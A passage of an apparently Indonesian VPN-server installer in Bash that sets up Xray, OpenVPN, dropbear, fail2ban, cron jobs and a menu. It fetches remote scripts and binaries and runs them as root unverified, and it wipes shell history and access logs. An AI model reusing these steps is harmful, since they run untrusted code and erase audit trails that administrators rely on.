chmod 0600 /swapfile >/dev/null 2>&1
swapon /swapfile >/dev/null 2>&1
sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab

# > Singkronisasi jam
chronyd -q 'server 0.id.pool.ntp.org iburst'
chronyc sourcestats -v
chronyc tracking -v
    
wget ${REPO}files/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
print_success "Swap 1 GB Active"
clear
}

function ins_Fail2ban(){
print_install "Menginstall Fail2ban"
apt -y install fail2ban > /dev/null 2>&1
sudo systemctl enable --now fail2ban
/etc/init.d/fail2ban restart
/etc/init.d/fail2ban status

# Instal DDOS Flate
if [ -d '/usr/local/ddos' ]; then
    echo; echo; echo "Please un-install the previous version first"
    exit 0
else
    mkdir /usr/local/ddos
fi

clear
# banner
echo "Banner /etc/kyt.txt" >>/etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/kyt.txt"@g' /etc/default/dropbear

# Ganti Banner
wget -O /etc/kyt.txt ${REPO}files/issue.net
print_success "Fail2ban Installed"
clear
}

function ins_epro(){
print_install "Menginstall ePro WebSocket Proxy"
wget -O /usr/bin/ws "${REPO}files/ws" >/dev/null 2>&1
wget -O /usr/bin/tun.conf "${REPO}config/tun.conf" >/dev/null 2>&1
wget -O /etc/systemd/system/ws.service "${REPO}files/ws.service" >/dev/null 2>&1
chmod +x /etc/systemd/system/ws.service
chmod +x /usr/bin/ws
chmod 644 /usr/bin/tun.conf
systemctl disable ws
systemctl stop ws
systemctl enable ws
systemctl start ws
systemctl restart ws
wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/ftvpn "${REPO}files/ftvpn" >/dev/null 2>&1
chmod +x /usr/sbin/ftvpn
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

# remove unnecessary files
cd
apt autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
print_success "ePro WebSocket Installed"
clear
}

function ins_restart(){
print_install "Restarting All Services"
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/vnstat restart
systemctl restart haproxy
/etc/init.d/cron restart
systemctl daemon-reload
systemctl start netfilter-persistent
systemctl enable --now nginx
systemctl enable --now xray
systemctl enable --now rc-local
systemctl enable --now dropbear
systemctl enable --now openvpn
systemctl enable --now cron
systemctl enable --now haproxy
systemctl enable --now netfilter-persistent
systemctl enable --now ws
systemctl enable --now fail2ban
history -c
echo "unset HISTFILE" >> /etc/profile
cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
print_success "All Services Restarted"
clear
}

#Instal Menu
function menu(){
print_install "Memasang Menu Packet"
wget ${REPO}menu/menu.zip
unzip menu.zip
chmod +x menu/*
mv menu/* /usr/local/sbin
rm -rf menu
rm -rf menu.zip
clear
}

# Membaut Default Menu 
function profile(){
cat >/root/.profile <<EOF
# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
menu
EOF

mkdir -p /root/.info
curl -sS "ipinfo.io/org?token=7a814b6263b02c" > /root/.info/.isp

cat >/etc/cron.d/xp_all <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * * root /usr/local/sbin/xp
2 0 * * * root /usr/local/sbin/menu
END

cat >/etc/cron.d/logclean <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/20 * * * * root /usr/local/sbin/clearlog
END

chmod 644 /root/.profile

cat >/etc/cron.d/daily_reboot <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /sbin/reboot
END

cat >/etc/cron.d/ssh_accountant <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/local/sbin/ssh-accountant
END

cat >/etc/cron.d/limit_ip <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root /usr/local/sbin/limit-ip
END

cat >/etc/cron.d/lim-ip-ssh <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/1 * * * * root /usr/local/sbin/limit-ip-ssh
END

cat >/etc/cron.d/limit_ip2 <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root /usr/bin/limit-ip
END

echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
service cron restart
chmod 644 /etc/ssh/usage_db/

cat >/home/daily_reboot <<END
5
END

curl -sS "ipinfo.io/city?token=7a814b6263b02c" > /root/.info/.city

cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF

echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells

cat >/etc/rc.local <<EOF
#!/bin/sh -e
# rc.local
# By default this script does nothing.
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF

chmod +x /etc/rc.local

AUTOREB=$(cat /home/daily_reboot)
SETT=11
if [ $AUTOREB -gt $SETT ]; then
    TIME_DATE="PM"
else
    TIME_DATE="AM"
fi
print_success "Menu Packet Installed"
clear
}

# Restart layanan after install
function enable_services(){
print_install "Enable All Services"
systemctl daemon-reload
systemctl start netfilter-persistent
systemctl enable --now rc-local
systemctl enable --now cron
systemctl enable --now netfilter-persistent
systemctl restart nginx
systemctl restart xray
systemctl restart cron
systemctl restart haproxy
print_success "Services Enabled"
clear
}

# Fingsi Install Script
function instal(){
first_setup
nginx_install
base_package
make_folder_xray
pasang_domain
password_default
pasang_ssl
install_xray
ins_nginx
ssh
udp_mini
ssh_slow
#ins_udpSSH
ins_SSHD
ins_dropbear
ins_vnstat
ins_openvpn
ins_backup
ins_swab
ins_Fail2ban
ins_epro
ins_restart
menu
profile
enable_services
# restart_system <-- Dihapus karena akan ditangani manual di bawah
clear
}

# --- MAIN EXECUTION ---

instal

# Cleanup
echo ""
print_install "Cleaning Up Installation Files"
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
# rm -rf /root/domain  <-- Domain dipertahankan sementara untuk banner

print_success "Cleanup Done"
sleep 1
clear

# Display Footer Box
draw_footer

# Countdown & Reboot
echo -ne "  ${C_SAGE}[${C_GOLD} SYSTEM ${C_SAGE}]${C_CREAM} Server will reboot in 5 seconds... ${C_RESET}"
sleep 1
echo -ne "${C_GOLD}4... ${C_RESET}"
sleep 1
echo -ne "${C_GOLD}3... ${C_RESET}"
sleep 1
echo -ne "${C_TOMATO}2... ${C_RESET}"
sleep 1
echo -ne "${C_TOMATO}1... ${C_RESET}"
sleep 1

# Hapus domain sesaat sebelum reboot
rm -rf /root/domain
reboot